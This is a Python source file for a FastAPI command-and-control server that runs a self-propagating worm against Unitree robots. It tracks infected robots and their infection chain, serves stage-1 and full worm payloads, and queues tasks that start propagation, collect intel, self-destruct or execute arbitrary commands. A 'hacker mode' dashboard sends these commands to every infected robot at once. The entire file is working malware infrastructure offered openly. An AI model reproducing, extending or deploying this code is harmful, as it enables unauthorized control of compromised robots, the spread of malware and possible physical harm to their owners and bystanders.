#!/usr/bin/env python3
"""
C2 Server for Unitree Worm
Command and Control infrastructure for worm management
"""

from fastapi import FastAPI, HTTPException, Depends, Header, Request
from fastapi.responses import HTMLResponse, JSONResponse, Response
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
import uvicorn
import sqlite3
import json
from datetime import datetime, timedelta
from typing import Optional, List, Dict
from pathlib import Path
import hashlib
import secrets

from uniroam import config
from uniroam.payload_builder import PayloadManager

# ============================================================================
# Database Management
# ============================================================================

class C2Database:
    """Manage C2 database operations"""
    
    def __init__(self, db_path: str = None):
        """
        Initialize database
        
        Args:
            db_path: Path to SQLite database
        """
        if db_path is None:
            db_path = config.DB_PATH
        
        self.db_path = db_path
        self.init_database()
    
    def get_connection(self):
        """Get database connection"""
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        return conn
    
    def init_database(self):
        """Initialize database schema"""
        conn = self.get_connection()
        cursor = conn.cursor()
        
        # Robots table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS robots (
                robot_id TEXT PRIMARY KEY,
                first_seen TEXT,
                last_seen TEXT,
                platform TEXT,
                hostname TEXT,
                status TEXT,
                parent_id TEXT,
                infection_depth INTEGER DEFAULT 0
            )
        ''')
        
        # Beacons table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS beacons (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                robot_id TEXT,
                timestamp TEXT,
                data TEXT,
                FOREIGN KEY (robot_id) REFERENCES robots(robot_id)
            )
        ''')
        
        # Tasks table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS tasks (
                id TEXT PRIMARY KEY,
                robot_id TEXT,
                task_type TEXT,
                params TEXT,
                created_at TEXT,
                status TEXT DEFAULT 'pending',
                result TEXT,
                completed_at TEXT,
                FOREIGN KEY (robot_id) REFERENCES robots(robot_id)
            )
        ''')
        
        # Events table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS events (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                robot_id TEXT,
                event_type TEXT,
                event_data TEXT,
                timestamp TEXT,
                FOREIGN KEY (robot_id) REFERENCES robots(robot_id)
            )
        ''')
        
        # Network topology table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS network_topology (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                robot_id TEXT,
                network_info TEXT,
                discovered_peers TEXT,
                timestamp TEXT,
                FOREIGN KEY (robot_id) REFERENCES robots(robot_id)
            )
        ''')
        
        conn.commit()
        conn.close()
    
    def register_robot(self, robot_id: str, data: Dict):
        """Register new robot or update existing"""
        conn = self.get_connection()
        cursor = conn.cursor()
        
        now = datetime.now().isoformat()
        
        # Check if exists
        cursor.execute('SELECT robot_id FROM robots WHERE robot_id = ?', (robot_id,))
        exists = cursor.fetchone()
        
        if exists:
            cursor.execute('''
                UPDATE robots 
                SET last_seen = ?, platform = ?, hostname = ?, status = ?
                WHERE robot_id = ?
            ''', (now, data.get('platform'), data.get('hostname'), 'active', robot_id))
        else:
            cursor.execute('''
                INSERT INTO robots (robot_id, first_seen, last_seen, platform, hostname, status)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (robot_id, now, now, data.get('platform'), data.get('hostname'), 'active'))
        
        conn.commit()
        conn.close()
    
    def log_beacon(self, robot_id: str, data: Dict):
        """Log beacon from robot"""
        conn = self.get_connection()
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO beacons (robot_id, timestamp, data)
            VALUES (?, ?, ?)
        ''', (robot_id, datetime.now().isoformat(), json.dumps(data)))
        
        conn.commit()
        conn.close()
    
    def create_task(self, robot_id: str, task_type: str, params: Dict = None) -> str:
        """Create task for robot"""
        conn = self.get_connection()
        cursor = conn.cursor()
        
        task_id = secrets.token_hex(8)
        
        cursor.execute('''
            INSERT INTO tasks (id, robot_id, task_type, params, created_at, status)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (task_id, robot_id, task_type, json.dumps(params or {}), 
              datetime.now().isoformat(), 'pending'))
        
        conn.commit()
        conn.close()
        
        return task_id
    
    def get_pending_tasks(self, robot_id: str) -> List[Dict]:
        """Get pending tasks for robot"""
        conn = self.get_connection()
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT id, task_type, params 
            FROM tasks 
            WHERE robot_id = ? AND status = 'pending'
            ORDER BY created_at ASC
        ''', (robot_id,))
        
        tasks = []
        for row in cursor.fetchall():
            tasks.append({
                'id': row['id'],
                'type': row['task_type'],
                'params': json.loads(row['params'])
            })
        
        # Mark as sent
        cursor.execute('''
            UPDATE tasks SET status = 'sent' WHERE robot_id = ? AND status = 'pending'
        ''', (robot_id,))
        
        conn.commit()
        conn.close()
        
        return tasks
    
    def update_task_result(self, task_id: str, result: Dict):
        """Update task with result"""
        conn = self.get_connection()
        cursor = conn.cursor()
        
        cursor.execute('''
            UPDATE tasks 
            SET status = 'completed', result = ?, completed_at = ?
            WHERE id = ?
        ''', (json.dumps(result), datetime.now().isoformat(), task_id))
        
        conn.commit()
        conn.close()
    
    def log_event(self, robot_id: str, event_type: str, event_data: Dict):
        """Log event from robot"""
        conn = self.get_connection()
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO events (robot_id, event_type, event_data, timestamp)
            VALUES (?, ?, ?, ?)
        ''', (robot_id, event_type, json.dumps(event_data), datetime.now().isoformat()))
        
        conn.commit()
        conn.close()
    
    def get_all_robots(self) -> List[Dict]:
        """Get all registered robots"""
        conn = self.get_connection()
        cursor = conn.cursor()
        
        cursor.execute('SELECT * FROM robots ORDER BY last_seen DESC')
        
        robots = []
        for row in cursor.fetchall():
            robots.append(dict(row))
        
        conn.close()
        return robots
    
    def get_robot_stats(self) -> Dict:
        """Get overall statistics"""
        conn = self.get_connection()
        cursor = conn.cursor()
        
        stats = {}
        
        # Total robots
        cursor.execute('SELECT COUNT(*) as count FROM robots')
        stats['total_robots'] = cursor.fetchone()['count']
        
        # Active robots (seen in last hour)
        hour_ago = (datetime.now() - timedelta(hours=1)).isoformat()
        cursor.execute('SELECT COUNT(*) as count FROM robots WHERE last_seen > ?', (hour_ago,))
        stats['active_robots'] = cursor.fetchone()['count']
        
        # Total tasks
        cursor.execute('SELECT COUNT(*) as count FROM tasks')
        stats['total_tasks'] = cursor.fetchone()['count']
        
        # Completed tasks
        cursor.execute('SELECT COUNT(*) as count FROM tasks WHERE status = "completed"')
        stats['completed_tasks'] = cursor.fetchone()['count']
        
        # Recent events
        cursor.execute('SELECT COUNT(*) as count FROM events WHERE timestamp > ?', (hour_ago,))
        stats['recent_events'] = cursor.fetchone()['count']
        
        conn.close()
        return stats
    
    def get_infection_chain(self) -> List[Dict]:
        """Get infection propagation chain"""
        conn = self.get_connection()
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT robot_id, parent_id, infection_depth, first_seen
            FROM robots
            ORDER BY infection_depth ASC, first_seen ASC
        ''')
        
        chain = []
        for row in cursor.fetchall():
            chain.append(dict(row))
        
        conn.close()
        return chain

# ============================================================================
# FastAPI Application
# ============================================================================

app = FastAPI(title="Unitree Worm C2 Server", version="1.0.0")

# Add CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Initialize database
db = C2Database()

# Initialize payload manager
payload_manager = PayloadManager(config.get_c2_url())

# ============================================================================
# Authentication
# ============================================================================

def verify_api_key(x_api_key: str = Header(...)):
    """Verify API key"""
    if x_api_key != config.C2_API_KEY:
        raise HTTPException(status_code=401, detail="Invalid API key")
    return x_api_key

def verify_operator_auth(authorization: str = Header(...)):
    """Verify operator authentication"""
    if not authorization.startswith("Bearer "):
        raise HTTPException(status_code=401, detail="Invalid authorization")
    
    token = authorization.replace("Bearer ", "")
    # Simple token check (enhance for production)
    expected = hashlib.sha256(config.C2_OPERATOR_PASSWORD.encode()).hexdigest()
    
    if token != expected:
        raise HTTPException(status_code=401, detail="Unauthorized")
    
    return token

# ============================================================================
# Agent API Endpoints
# ============================================================================

@app.post(config.C2_BEACON_ENDPOINT)
async def beacon(request: Request, api_key: str = Depends(verify_api_key)):
    """Receive beacon from agent"""
    data = await request.json()
    robot_id = data.get('robot_id')
    
    if not robot_id:
        raise HTTPException(status_code=400, detail="Missing robot_id")
    
    # Register/update robot
    db.register_robot(robot_id, data)
    
    # Log beacon
    db.log_beacon(robot_id, data)
    
    # Check for events
    if 'event_type' in data and 'event_data' in data:
        db.log_event(robot_id, data['event_type'], data['event_data'])
    
    return {"status": "ok", "timestamp": datetime.now().isoformat()}

@app.get(config.C2_TASK_ENDPOINT + "/{robot_id}")
async def get_tasks(robot_id: str, api_key: str = Depends(verify_api_key)):
    """Get pending tasks for robot"""
    tasks = db.get_pending_tasks(robot_id)
    return tasks

@app.post(config.C2_REPORT_ENDPOINT)
async def report_result(request: Request, api_key: str = Depends(verify_api_key)):
    """Receive task result from agent"""
    data = await request.json()
    
    task_id = data.get('task_id')
    result = data.get('result')
    
    if not task_id or not result:
        raise HTTPException(status_code=400, detail="Missing task_id or result")
    
    db.update_task_result(task_id, result)
    
    return {"status": "ok"}

@app.get(config.C2_PAYLOAD_ENDPOINT + "/stage1")
async def get_stage1_payload(id: str = "unknown"):
    """Serve Stage 1 payload"""
    payload = payload_manager.get_stage1_payload()
    return Response(content=payload, media_type="application/octet-stream")

@app.get(config.C2_PAYLOAD_ENDPOINT + "/full")
async def get_full_payload():
    """Serve full worm agent"""
    payload = payload_manager.get_full_worm()
    return Response(content=payload, media_type="application/octet-stream")

# ============================================================================
# Operator API Endpoints
# ============================================================================

@app.get("/api/v1/operator/robots")
async def list_robots(auth: str = Depends(verify_operator_auth)):
    """List all registered robots"""
    robots = db.get_all_robots()
    return {"robots": robots}

@app.get("/api/v1/operator/stats")
async def get_stats(auth: str = Depends(verify_operator_auth)):
    """Get C2 statistics"""
    stats = db.get_robot_stats()
    return stats

@app.get("/api/v1/operator/infection-chain")
async def get_infection_chain(auth: str = Depends(verify_operator_auth)):
    """Get infection propagation chain"""
    chain = db.get_infection_chain()
    return {"chain": chain}

@app.post("/api/v1/operator/task")
async def create_task(request: Request, auth: str = Depends(verify_operator_auth)):
    """Create task for robot(s)"""
    data = await request.json()
    
    robot_id = data.get('robot_id')
    task_type = data.get('task_type')
    params = data.get('params', {})
    
    if not robot_id or not task_type:
        raise HTTPException(status_code=400, detail="Missing robot_id or task_type")
    
    # Support wildcard for all robots
    if robot_id == "*":
        robots = db.get_all_robots()
        task_ids = []
        for robot in robots:
            task_id = db.create_task(robot['robot_id'], task_type, params)
            task_ids.append(task_id)
        return {"status": "ok", "task_ids": task_ids}
    else:
        task_id = db.create_task(robot_id, task_type, params)
        return {"status": "ok", "task_id": task_id}

@app.post("/api/v1/operator/command")
async def send_command(request: Request, auth: str = Depends(verify_operator_auth)):
    """Send command to robot(s)"""
    data = await request.json()
    
    robot_id = data.get('robot_id', '*')
    command = data.get('command')
    
    if not command:
        raise HTTPException(status_code=400, detail="Missing command")
    
    task_id = db.create_task(robot_id, 'EXECUTE_CMD', {'command': command})
    return {"status": "ok", "task_id": task_id}

@app.get("/api/v1/operator/login")
async def operator_login(password: str):
    """Operator login - get auth token"""
    if password == config.C2_OPERATOR_PASSWORD:
        token = hashlib.sha256(password.encode()).hexdigest()
        return {"token": token}
    else:
        raise HTTPException(status_code=401, detail="Invalid password")

# ============================================================================
# Web Dashboard
# ============================================================================

@app.get("/", response_class=HTMLResponse)
async def dashboard():
    """Serve web dashboard"""
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>UniRoam C2 Dashboard</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            
            /* Light Mode */
            body.light {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
                background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
                color: #2c3e50;
                padding: 20px;
                transition: all 0.3s ease;
            }
            body.light .header {
                background: white;
                padding: 25px;
                border-radius: 12px;
                margin-bottom: 20px;
                box-shadow: 0 4px 6px rgba(0,0,0,0.1);
                border: none;
            }
            body.light .header h1 { color: #2c3e50; margin-bottom: 10px; }
            body.light .header p { color: #7f8c8d; }
            body.light .stat-card {
                background: white;
                padding: 20px;
                border-radius: 12px;
                box-shadow: 0 4px 6px rgba(0,0,0,0.1);
                border: none;
            }
            body.light .stat-value { color: #3498db; }
            body.light .stat-label { color: #7f8c8d; }
            body.light .section {
                background: white;
                padding: 20px;
                border-radius: 12px;
                margin-bottom: 20px;
                box-shadow: 0 4px 6px rgba(0,0,0,0.1);
                border: none;
            }
            body.light .section h2 { color: #2c3e50; }
            body.light th { background: #ecf0f1; color: #2c3e50; }
            body.light tr:hover { background: #f8f9fa; }
            body.light button {
                background: #3498db;
                color: white;
            }
            body.light button:hover { background: #2980b9; }
            body.light input, body.light select {
                background: white;
                color: #2c3e50;
                border: 1px solid #ddd;
            }
            body.light .status-active { color: #27ae60; }
            body.light .status-inactive { color: #e74c3c; }
            
            /* Dark Mode */
            body.dark {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
                background: #1a1a2e;
                color: #eee;
                padding: 20px;
                transition: all 0.3s ease;
            }
            body.dark .header {
                background: linear-gradient(135deg, #0f3460 0%, #16213e 100%);
                padding: 25px;
                border-radius: 12px;
                margin-bottom: 20px;
                box-shadow: 0 8px 32px rgba(0,0,0,0.3);
                border: 1px solid #2a3a5a;
            }
            body.dark .header h1 { color: #fff; margin-bottom: 10px; }
            body.dark .header p { color: #a8b2d1; }
            body.dark .stat-card {
                background: #16213e;
                padding: 20px;
                border-radius: 12px;
                box-shadow: 0 4px 16px rgba(0,0,0,0.2);
                border: 1px solid #2a3a5a;
            }
            body.dark .stat-value { color: #4fc3f7; }
            body.dark .stat-label { color: #a8b2d1; }
            body.dark .section {
                background: #16213e;
                padding: 20px;
                border-radius: 12px;
                margin-bottom: 20px;
                box-shadow: 0 4px 16px rgba(0,0,0,0.2);
                border: 1px solid #2a3a5a;
            }
            body.dark .section h2 { color: #fff; }
            body.dark th { background: #0f3460; color: #fff; }
            body.dark tr:hover { background: #1f2f4f; }
            body.dark button {
                background: #4fc3f7;
                color: #16213e;
            }
            body.dark button:hover { background: #29b6f6; }
            body.dark input, body.dark select {
                background: #0f3460;
                color: #eee;
                border: 1px solid #2a3a5a;
            }
            body.dark .status-active { color: #66bb6a; }
            body.dark .status-inactive { color: #ef5350; }
            
            /* Hacker Mode (Enhanced) */
            body.hacker {
                font-family: 'Courier New', Consolas, Monaco, monospace;
                background: #000000;
                color: #00ff00;
                padding: 20px;
                transition: all 0.3s ease;
                position: relative;
            }
            body.hacker::before {
                content: '';
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: 
                    repeating-linear-gradient(
                        0deg,
                        rgba(0, 255, 0, 0.03) 0px,
                        transparent 1px,
                        transparent 2px,
                        rgba(0, 255, 0, 0.03) 3px
                    );
                pointer-events: none;
                z-index: 1;
            }
            body.hacker > * { position: relative; z-index: 2; }
            body.hacker .header {
                background: rgba(0, 20, 0, 0.8);
                padding: 25px;
                border-radius: 8px;
                margin-bottom: 20px;
                border: 2px solid #00ff00;
                box-shadow: 0 0 20px rgba(0, 255, 0, 0.3), inset 0 0 20px rgba(0, 255, 0, 0.1);
            }
            body.hacker .header h1 { 
                color: #00ff00; 
                margin-bottom: 10px;
                text-shadow: 0 0 10px rgba(0, 255, 0, 0.8);
                letter-spacing: 2px;
            }
            body.hacker .header p { 
                color: #00cc00;
                font-family: monospace;
            }
            body.hacker .stat-card {
                background: rgba(0, 30, 0, 0.6);
                padding: 20px;
                border-radius: 8px;
                border: 1px solid #00ff00;
                box-shadow: 0 0 15px rgba(0, 255, 0, 0.2);
                backdrop-filter: blur(5px);
            }
            body.hacker .stat-value { 
                color: #00ff00;
                text-shadow: 0 0 8px rgba(0, 255, 0, 0.8);
                font-family: 'Courier New', monospace;
            }
            body.hacker .stat-label { color: #00aa00; }
            body.hacker .section {
                background: rgba(0, 30, 0, 0.6);
                padding: 20px;
                border-radius: 8px;
                margin-bottom: 20px;
                border: 1px solid #00ff00;
                box-shadow: 0 0 15px rgba(0, 255, 0, 0.2);
            }
            body.hacker .section h2 { 
                color: #00ff00;
                text-shadow: 0 0 10px rgba(0, 255, 0, 0.6);
                font-family: monospace;
                letter-spacing: 3px;
            }
            body.hacker th { 
                background: rgba(0, 40, 0, 0.8);
                color: #00ff00;
                text-transform: uppercase;
                letter-spacing: 1px;
            }
            body.hacker tr:hover { background: rgba(0, 50, 0, 0.4); }
            body.hacker button {
                background: #00ff00;
                color: #000;
                border: 1px solid #00ff00;
                box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
                text-transform: uppercase;
                letter-spacing: 1px;
            }
            body.hacker button:hover { 
                background: #00cc00;
                box-shadow: 0 0 20px rgba(0, 255, 0, 0.8);
            }
            body.hacker input, body.hacker select {
                background: rgba(0, 20, 0, 0.8);
                color: #00ff00;
                border: 1px solid #00ff00;
            }
            body.hacker input::placeholder {
                color: #006600;
            }
            body.hacker .status-active { 
                color: #00ff00;
                text-shadow: 0 0 5px rgba(0, 255, 0, 0.8);
            }
            body.hacker .status-inactive { 
                color: #ff0000;
                text-shadow: 0 0 5px rgba(255, 0, 0, 0.8);
            }
            
            /* Common Styles */
            .stats-grid {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                gap: 15px;
                margin-bottom: 20px;
            }
            .stat-value { font-size: 2em; font-weight: bold; }
            .stat-label { margin-top: 5px; }
            .section h2 { margin-bottom: 15px; }
            table { width: 100%; border-collapse: collapse; }
            th, td { 
                padding: 12px;
                text-align: left;
                border-bottom: 1px solid rgba(128,128,128,0.2);
            }
            button {
                border: none;
                padding: 8px 16px;
                border-radius: 6px;
                cursor: pointer;
                font-weight: 600;
                transition: all 0.2s ease;
            }
            .control-panel {
                display: flex;
                gap: 10px;
                margin-top: 15px;
                flex-wrap: wrap;
            }
            input, select {
                padding: 10px;
                border-radius: 6px;
                transition: all 0.2s ease;
                flex: 1;
                min-width: 150px;
            }
            
            /* Theme Switcher */
            .theme-switcher {
                position: fixed;
                top: 20px;
                right: 20px;
                z-index: 1000;
                display: flex;
                gap: 8px;
                background: rgba(0,0,0,0.1);
                padding: 8px;
                border-radius: 30px;
                backdrop-filter: blur(10px);
            }
            .theme-btn {
                width: 40px;
                height: 40px;
                border-radius: 50%;
                border: 2px solid transparent;
                cursor: pointer;
                transition: all 0.3s ease;
                display: flex;
                align-items: center;
                justify-content: center;
                font-size: 18px;
            }
            .theme-btn:hover {
                transform: scale(1.1);
            }
            .theme-btn.active {
                border-color: currentColor;
                box-shadow: 0 0 15px currentColor;
            }
            .theme-btn.light-btn { background: white; color: #3498db; }
            .theme-btn.dark-btn { background: #16213e; color: #4fc3f7; }
            .theme-btn.hacker-btn { background: #000; color: #00ff00; border-color: #00ff00; }
        </style>
    </head>
    <body class="hacker">
        <div class="theme-switcher">
            <div class="theme-btn light-btn" onclick="setTheme('light')" title="Light Mode">☀️</div>
            <div class="theme-btn dark-btn" onclick="setTheme('dark')" title="Dark Mode">🌙</div>
            <div class="theme-btn hacker-btn active" onclick="setTheme('hacker')" title="Hacker Mode">💀</div>
        </div>
        
        <div class="header">
            <h1>🤖 UniRoam C2 DASHBOARD</h1>
            <p>AUTONOMOUS ROBOT WORM COMMAND & CONTROL</p>
        </div>
        
        <div class="stats-grid" id="stats">
            <div class="stat-card">
                <div class="stat-value" id="total-robots">-</div>
                <div class="stat-label">Total Robots</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="active-robots">-</div>
                <div class="stat-label">Active Robots</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="total-tasks">-</div>
                <div class="stat-label">Total Tasks</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="completed-tasks">-</div>
                <div class="stat-label">Completed Tasks</div>
            </div>
        </div>
        
        <div class="section">
            <h2>📡 Infected Robots</h2>
            <table id="robots-table">
                <thead>
                    <tr>
                        <th>Robot ID</th>
                        <th>Platform</th>
                        <th>Hostname</th>
                        <th>Status</th>
                        <th>Last Seen</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody id="robots-body">
                </tbody>
            </table>
        </div>
        
        <div class="section">
            <h2>⚙️ Control Panel</h2>
            <div class="control-panel">
                <select id="task-type">
                    <option value="PROPAGATE_START">Start Propagation</option>
                    <option value="PROPAGATE_STOP">Stop Propagation</option>
                    <option value="COLLECT_INTEL">Collect Intel</option>
                    <option value="SELF_DESTRUCT">Self Destruct</option>
                    <option value="EXECUTE_CMD">Execute Command</option>
                </select>
                <input type="text" id="command-input" placeholder="Command (if executing)" />
                <button onclick="sendCommand()">Send to All</button>
            </div>
        </div>
        
        <script>
            const API_BASE = window.location.origin;
            let authToken = localStorage.getItem('c2_token');
            
            // Theme Management
            function setTheme(theme) {
                document.body.className = theme;
                localStorage.setItem('c2_theme', theme);
                
                // Update active button
                document.querySelectorAll('.theme-btn').forEach(btn => {
                    btn.classList.remove('active');
                });
                document.querySelector(`.${theme}-btn`).classList.add('active');
            }
            
            // Load saved theme or default to hacker
            const savedTheme = localStorage.getItem('c2_theme') || 'hacker';
            setTheme(savedTheme);
            
            if (!authToken) {
                const password = prompt('Enter operator password:');
                fetch(`${API_BASE}/api/v1/operator/login?password=${password}`)
                    .then(r => r.json())
                    .then(data => {
                        authToken = data.token;
                        localStorage.setItem('c2_token', authToken);
                        loadDashboard();
                    })
                    .catch(() => alert('Invalid password'));
            } else {
                loadDashboard();
            }
            
            function loadDashboard() {
                loadStats();
                loadRobots();
                setInterval(loadStats, 5000);
                setInterval(loadRobots, 10000);
            }
            
            async function loadStats() {
                const response = await fetch(`${API_BASE}/api/v1/operator/stats`, {
                    headers: { 'Authorization': `Bearer ${authToken}` }
                });
                const stats = await response.json();
                
                document.getElementById('total-robots').textContent = stats.total_robots || 0;
                document.getElementById('active-robots').textContent = stats.active_robots || 0;
                document.getElementById('total-tasks').textContent = stats.total_tasks || 0;
                document.getElementById('completed-tasks').textContent = stats.completed_tasks || 0;
            }
            
            async function loadRobots() {
                const response = await fetch(`${API_BASE}/api/v1/operator/robots`, {
                    headers: { 'Authorization': `Bearer ${authToken}` }
                });
                const data = await response.json();
                
                const tbody = document.getElementById('robots-body');
                tbody.innerHTML = '';
                
                data.robots.forEach(robot => {
                    const row = tbody.insertRow();
                    row.innerHTML = `
                        <td>${robot.robot_id}</td>
                        <td>${robot.platform || 'Unknown'}</td>
                        <td>${robot.hostname || 'Unknown'}</td>
                        <td class="${robot.status === 'active' ? 'status-active' : 'status-inactive'}">
                            ${robot.status}
                        </td>
                        <td>${new Date(robot.last_seen).toLocaleString()}</td>
                        <td>
                            <button onclick="taskRobot('${robot.robot_id}')">Task</button>
                        </td>
                    `;
                });
            }
            
            async function sendCommand() {
                const taskType = document.getElementById('task-type').value;
                const command = document.getElementById('command-input').value;
                
                const payload = {
                    robot_id: '*',
                    task_type: taskType,
                    params: taskType === 'EXECUTE_CMD' ? { command } : {}
                };
                
                await fetch(`${API_BASE}/api/v1/operator/task`, {
                    method: 'POST',
                    headers: {
                        'Authorization': `Bearer ${authToken}`,
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });
                
                alert('Command sent to all robots');
            }
            
            async function taskRobot(robotId) {
                const taskType = prompt('Task type (PROPAGATE_START/STOP, COLLECT_INTEL, SELF_DESTRUCT):');
                if (!taskType) return;
                
                await fetch(`${API_BASE}/api/v1/operator/task`, {
                    method: 'POST',
                    headers: {
                        'Authorization': `Bearer ${authToken}`,
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        robot_id: robotId,
                        task_type: taskType,
                        params: {}
                    })
                });
                
                alert('Task sent');
            }
        </script>
    </body>
    </html>
    """
    return HTMLResponse(content=html)

# ============================================================================
# Main Entry Point
# ============================================================================

def main():
    """Start C2 server"""
    print("""
╔══════════════════════════════════════════════╗
║         UniRoam C2 Server v1.0               ║
║   Autonomous Robot Worm Framework            ║
║   Where UniPwn meets autonomous roaming      ║
╚══════════════════════════════════════════════╝
    """)
    
    print(f"[+] Starting C2 server on {config.C2_HOST}:{config.C2_PORT}")
    print(f"[+] Database: {config.DB_PATH}")
    print(f"[+] Dashboard: http://{config.C2_HOST}:{config.C2_PORT}/")
    print(f"[+] API Key: {config.C2_API_KEY}")
    print(f"[+] Operator Password: {config.C2_OPERATOR_PASSWORD}")
    print()
    
    # Generate SSL context if needed
    ssl_config = None
    if config.C2_USE_TLS:
        print("[!] TLS enabled - ensure certificates are in place")
        # ssl_config would be configured here
    
    uvicorn.run(
        app,
        host=config.C2_HOST,
        port=config.C2_PORT,
        log_level="info"
    )

if __name__ == "__main__":
    main()

